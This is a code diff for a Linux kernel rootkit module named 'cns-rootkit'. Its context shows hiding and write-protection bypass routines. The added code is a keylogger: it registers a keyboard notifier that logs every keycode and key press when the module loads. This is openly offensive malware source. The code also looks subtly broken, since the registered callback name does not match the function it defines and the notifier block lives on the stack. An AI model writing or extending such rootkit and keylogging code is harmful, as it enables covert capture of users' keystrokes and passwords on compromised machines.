@@ -5,6 +5,9 @@
 #include <linux/fs.h>
 #include <linux/slab.h>
 #include <linux/string.h>
+#include <linux/notifier.h>
+#include <linux/keyboard.h>
+#include <linux/console.h>
 
 #define DISABLE_W_PROTECTED_MEMORY \
     do { \
@@ -220,6 +223,25 @@ void cns_rootkit_unhide(void)
     is_hidden = 0;
 }
 
+int cns_keyboard_notifier(struct notifier_block *nb, unsigned long action, void *_data) {
+  struct keyboard_notifier_param *data = (struct keyboard_notifier_param*)_data;
+  struct vc_data *vc = data->vc;
+
+  if(action == KBD_KEYCODE) {
+    printk(KERN_INFO "cns-rootkit: Keylogger %i %s\n", data->value, (data->down ? "down" : "up"));
+  }
+
+  return NOTIFY_OK;
+}
+
+void cns_rootkit_register_keylogger(void) {
+  struct notifier_block cns_kb_notifier_block = {
+    .notifier_call = cns_kb_notifier
+  };
+
+  register_keyboard_notifier(&cns_kb_notifier_block);
+}
+
 
 static int cns_rootkit_init(void) {
   printk(KERN_INFO "cns-rootkit: Init\n");
@@ -227,11 +249,13 @@ static int cns_rootkit_init(void) {
   if(establish_comm_channel() < 0) {
     printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
   }
+  cns_rootkit_register_keylogger();
   return 0;
 }
 
 static void cns_rootkit_exit(void) {
   unestablish_comm_channel();
+
   printk(KERN_INFO "cns-rootkit: Exit\n");
 
 }
